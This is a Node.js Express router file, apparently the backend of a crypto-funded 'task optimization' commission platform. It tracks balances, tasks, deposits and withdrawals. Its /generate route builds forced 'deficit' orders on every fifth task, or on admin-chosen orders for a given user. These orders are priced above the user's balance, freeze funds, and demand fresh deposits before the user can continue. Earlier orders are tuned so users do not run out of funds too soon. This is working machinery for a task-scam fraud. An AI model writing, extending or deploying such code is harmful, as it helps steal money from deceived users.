const express = require('express');
const router = express.Router();
const db = require('../db');
const { authMiddleware } = require('../middleware/auth');

// GET /api/tasks/status - Get current user task statistics
router.get('/status', authMiddleware, async (req, res) => {
  const user = await db.findUserById(req.user.id);
  const settings = await db.getSettings();
  const vipRate = (settings.vip_rates && settings.vip_rates[user.vip_level]) || { commission: 0.005, max_tasks: 38 };

  const userTasks = await db.getTasks(user.id);

  res.json({
    success: true,
    data: {
      balance: user.balance,
      frozen_balance: user.frozen_balance,
      today_profit: user.today_profit,
      today_tasks_completed: user.today_tasks_completed,
      max_tasks: vipRate.max_tasks || settings.daily_tasks_limit || 38,
      vip_level: user.vip_level,
      commission_rate: vipRate.commission,
      recent_tasks: userTasks.slice(0, 10)
    }
  });
});

// POST /api/tasks/generate - Simulate product matching
router.post('/generate', authMiddleware, async (req, res) => {
  const user = await db.findUserById(req.user.id);
  const settings = await db.getSettings();
  const vipRate = (settings.vip_rates && settings.vip_rates[user.vip_level]) || { commission: 0.20, max_tasks: 38 };

  if (user.today_tasks_completed >= vipRate.max_tasks) {
    return res.status(400).json({
      success: false,
      message: `You have completed all ${vipRate.max_tasks} daily optimization tasks for VIP ${user.vip_level}. Please upgrade VIP or return tomorrow!`
    });
  }

  // Check if there is already a pending task for this user
  const existingTasks = await db.getTasks(user.id);
  const existingPending = existingTasks.find(t => t.status === 'pending');
  if (existingPending) {
    return res.json({
      success: true,
      task: existingPending,
      is_existing: true
    });
  }

  if (user.balance <= 0) {
    return res.status(400).json({
      success: false,
      message: 'Insufficient working balance to match merchant orders. Please deposit funds to continue.'
    });
  }

  const currentOrder = user.today_tasks_completed + 1;
  const products = await db.getProducts();
  const randomProduct = products[Math.floor(Math.random() * products.length)] || {
    name: 'Amazon Premium Merchant Showcase Product',
    price: 99.00,
    image: 'assets/uploads/logo/1742595477_icon.png'
  };

  const commissionRate = vipRate.commission || 0.20;

  // Check if this is a Deficit / Forced Recharge Order:
  // 1. Admin explicitly configured custom deficit for this user
  const isAdminCustom = Boolean(user.custom_order_num && (user.custom_order_num === currentOrder || user.custom_order_num <= currentOrder));
  // 2. Default automatic rule: 5th order (or every 5th order)
  const isFifthOrder = Boolean(currentOrder === 5 || (currentOrder > 0 && currentOrder % 5 === 0));
  const isDeficit = isAdminCustom || isFifthOrder;

  let orderPrice;
  let deficitAmount = 0;
  let productName = randomProduct.name;
  let productImage = randomProduct.image || 'assets/uploads/logo/1742595477_icon.png';

  if (isDeficit) {
    // Determine deficit amount (default $20 - $30, or admin configured)
    deficitAmount = user.custom_deficit_amount !== null && user.custom_deficit_amount !== undefined
      ? parseFloat(user.custom_deficit_amount)
      : parseFloat((20 + (Math.random() * 10)).toFixed(2));

    if (user.custom_product_name) productName = user.custom_product_name;
    if (user.custom_product_price) {
      orderPrice = parseFloat(user.custom_product_price);
      deficitAmount = Math.max(10, parseFloat((orderPrice - user.balance).toFixed(2)));
    } else {
      orderPrice = parseFloat((user.balance + deficitAmount).toFixed(2));
    }

    // Update user's frozen deficit so profile/header shows held amount
    try {
      await db.updateUser(user.id, { frozen_balance: deficitAmount });
    } catch (_) {}
  } else {
    // Orders 1 to 4: Smart automatic distribution within user's existing balance
    // Ratio scales from ~45% up to ~75% so user never exhausts funds prematurely
    const ratio = Math.min(0.80, 0.40 + ((currentOrder - 1) * 0.10) + (Math.random() * 0.05));
    orderPrice = Math.max(15, parseFloat((user.balance * ratio).toFixed(2)));
  }

  const commissionAmount = parseFloat((orderPrice * commissionRate).toFixed(2));

  const task = {
    id: 'tsk_' + Date.now() + '_' + Math.floor(Math.random() * 1000),
    user_id: user.id,
    product_name: productName,
    product_image: productImage,
    product_price: orderPrice,
    commission_rate: commissionRate,
    commission_amount: commissionAmount,
    status: 'pending',
    order_num: currentOrder,
    is_deficit: isDeficit ? 1 : 0,
    deficit_amount: deficitAmount,
    created_at: new Date().toISOString()
  };

  await db.createTask(task);

  res.json({
    success: true,
    task,
    is_deficit: isDeficit,
    deficit_amount: deficitAmount
  });
});

// POST /api/tasks/submit - Submit review and claim commission
router.post('/submit', authMiddleware, async (req, res) => {
  const { taskId } = req.body;
  const user = await db.findUserById(req.user.id);

  if (!taskId) {
    return res.status(400).json({ success: false, message: 'Task ID required' });
  }

  const tasks = await db.getTasks(user.id);
  const task = tasks.find(t => t.id === taskId);

  if (!task) {
    return res.status(404).json({ success: false, message: 'Optimization task not found' });
  }

  if (task.status === 'completed') {
    return res.status(400).json({ success: false, message: 'Task already completed and commission claimed.' });
  }

  // Check if balance is sufficient to complete task
  if (user.balance < task.product_price) {
    const deficit = parseFloat((task.product_price - user.balance).toFixed(2));
    // Update user frozen balance to reflect the required deficit
    await db.updateUser(user.id, { frozen_balance: deficit });

    return res.status(400).json({
      success: false,
      reachedLimit: true,
      message: 'You have reached the frozen limit.',
      userFrozenBalance: deficit.toFixed(2),
      deficit_amount: deficit,
      product_price: task.product_price,
      user_balance: user.balance
    });
  }

  // Update task to completed
  await db.updateTask(taskId, {
    status: 'completed'
  });

  // Credit commission to user balance
  const newBalance = parseFloat((user.balance + task.commission_amount).toFixed(2));
  const newTodayProfit = parseFloat((user.today_profit + task.commission_amount).toFixed(2));
  const newCompletedTasks = user.today_tasks_completed + 1;
  const newTotalTasks = user.total_tasks_completed + 1;

  const updates = {
    balance: newBalance,
    frozen_balance: 0.00, // Deficit cleared on successful completion
    today_profit: newTodayProfit,
    today_tasks_completed: newCompletedTasks,
    total_tasks_completed: newTotalTasks,
    current_set: newCompletedTasks
  };

  // If this fulfilled an admin custom assignment, clear the custom overrides
  if (user.custom_order_num && user.custom_order_num <= newCompletedTasks) {
    updates.custom_order_num = null;
    updates.custom_deficit_amount = null;
    updates.custom_product_name = null;
    updates.custom_product_price = null;
  }

  await db.updateUser(user.id, updates);

  res.json({
    success: true,
    message: `Optimization successful! +$${task.commission_amount.toFixed(2)} credited to your account.`,
    data: {
      balance: newBalance,
      frozen_balance: 0.00,
      today_profit: newTodayProfit,
      today_tasks_completed: newCompletedTasks,
      commission_earned: task.commission_amount
    }
  });
});

// GET /api/tasks/records - List all user records (tasks, deposits, withdrawals)
router.get('/records', authMiddleware, async (req, res) => {
  try {
    const statusFilter = req.query.status;
    const userTasks = await db.getTasks(req.user.id);
    const userDeposits = await db.getDeposits(req.user.id);
    const userWithdrawals = await db.getWithdrawals(req.user.id);

    const formattedTasks = userTasks.map(t => ({
      id: t.id,
      type: 'task',
      title: t.product_name,
      order_num: t.order_num,
      amount: `+$${parseFloat(t.commission_amount || 0).toFixed(2)}`,
      status: t.status,
      created_at: t.created_at
    }));

    const formattedDeposits = userDeposits.map(d => ({
      id: d.id,
      type: 'deposit',
      title: `Deposit (${d.method || 'TRC20'})`,
      order_num: d.id.slice(-4),
      amount: `+$${parseFloat(d.amount || 0).toFixed(2)}`,
      status: d.status,
      created_at: d.created_at
    }));

    const formattedWithdrawals = userWithdrawals.map(w => ({
      id: w.id,
      type: 'withdrawal',
      title: `Withdrawal (${w.bank_name || 'USDT'})`,
      order_num: w.id.slice(-4),
      amount: `-$${parseFloat(w.amount || 0).toFixed(2)}`,
      status: w.status,
      created_at: w.created_at
    }));

    let allRecords = [...formattedTasks, ...formattedDeposits, ...formattedWithdrawals];
    allRecords.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));

    if (statusFilter && statusFilter !== 'all') {
      if (statusFilter === 'pending') {
        allRecords = allRecords.filter(r => r.status === 'pending');
      } else if (statusFilter === 'completed') {
        allRecords = allRecords.filter(r => r.status === 'completed' || r.status === 'approved');
      }
    }

    res.json({
      success: true,
      tasks: allRecords
    });
  } catch (err) {
    console.error('Records fetch error:', err);
    res.status(500).json({ success: false, message: 'Error fetching records' });
  }
});

module.exports = router;
